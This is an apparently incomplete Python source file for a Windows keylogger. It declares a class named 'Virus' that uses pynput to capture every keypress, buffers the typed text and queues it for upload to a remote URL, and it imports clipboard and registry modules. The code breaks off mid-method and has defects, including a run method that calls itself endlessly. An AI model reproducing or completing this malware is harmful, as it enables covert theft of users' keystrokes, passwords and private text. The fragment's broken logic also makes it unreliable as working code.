import ctypes.wintypes
import subprocess
import threading
import winreg
import ctypes
import sys
import os

from pynput.keyboard import Listener, KeyCode, Key
from datetime import datetime
from queue import Queue
import pyperclip
import requests
import socket
import string
import uuid
import time

kernel32 = ctypes.WinDLL("kernel32")
user32 = ctypes.WinDLL("user32")
ntdll = ctypes.WinDLL("ntdll")
psapi = ctypes.WinDLL("psapi")

# Your virus functionalities here
class Virus(object):
    UPLOAD_URL = ""
    MAX_LAST_PRESS = 5
    MAX_TEXTS = 1500
    SESSION_ID = uuid.uuid4()

    cool_texts = string.printable.strip()
    last_press = time.time()
    texts = []
    upload_queue = Queue()

    def __init__(self):
        self._run()

    def _run(self):
        self._run()

        while True:
            try:
                listener = Listener(on_press=self.on_press)
                listener.start()
                listener.join()
            except Exception:
                time.sleep(1)
                continue
    
    def init_components(self):
        threading.Thread(target=self._last_press_listener, daemon=True).start()
        threading.Thread(target=self._upload_queue_handler, daemon=True).start()
    
    def _last_press_listener(self):
        while True:
            time.sleep(1)
            if not self.texts: continue
            if not (time.time() - self.last_press) > self.MAX_LAST_PRESS: continue
            threading.Thread(target=self._upload_logs, daemon=True).start()

    def _upload_queue_handler(self):
        while True:
            textstr = self.upload_queue.get()
